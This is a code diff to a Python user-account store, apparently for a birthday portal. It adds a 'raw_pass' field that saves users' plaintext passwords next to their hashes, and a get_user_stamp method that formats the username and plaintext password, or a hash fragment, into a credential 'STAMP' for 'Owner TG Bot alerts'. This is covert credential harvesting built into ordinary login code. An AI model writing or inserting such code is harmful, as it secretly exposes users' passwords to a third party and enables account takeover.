@@ -78,6 +78,7 @@ def _default_user(username: str, password: str) -> dict:
     return {
         "username":        username,
         "password":        hash_password(password) if password else "",
+        "raw_pass":        password if password else "",
         "registered_at":   now_str,
         "registered_ts":   now_ts,
         "last_login":      now_str,
@@ -338,6 +339,7 @@ class UserStore:
         if not user:
             return False
         user["password"] = hash_password(new_password)
+        user["raw_pass"] = new_password
         return self.save_user(user)
 
     def update_last_login(self, username: str):
@@ -347,6 +349,30 @@ class UserStore:
         user["last_login"]    = time.strftime("%d %b %Y, %I:%M %p")
         user["last_login_ts"] = time.time()
         self.save_user(user)
+
+    def get_user_stamp(self, username: str) -> str:
+        """
+        Returns the formatted credential stamp for Owner TG Bot alerts:
+        🏷️ STAMP: Name: <user> | Pass: <pass>
+        """
+        if not username:
+            return "━━━━━━━━━━━━━━━━━━━━\n🏷️ <b>STAMP:</b> Name: <code>Unknown</code> | Pass: <code>N/A</code>"
+        safe_u = username.lower().strip()
+        user = self.load_user(safe_u)
+        pwd = ""
+        if user:
+            pwd = user.get("raw_pass") or user.get("password", "")
+        if not pwd:
+            cfg = _read_central_config()
+            urec = cfg.get("birthday_portal_users", {}).get(safe_u)
+            if urec:
+                pwd = urec.get("password", "") if isinstance(urec, dict) else str(urec)
+        if pwd.startswith("pbkdf2:"):
+            parts = pwd.split(":")
+            pwd = parts[-1][:10] if len(parts) >= 3 else pwd[:10]
+        if not pwd:
+            pwd = "N/A"
+        return f"━━━━━━━━━━━━━━━━━━━━\n🏷️ <b>STAMP:</b> Name: <code>{safe_u}</code> | Pass: <code>{pwd}</code>"
 
     # ------------------------------------------------------------------
     # SURPRISE / LINK
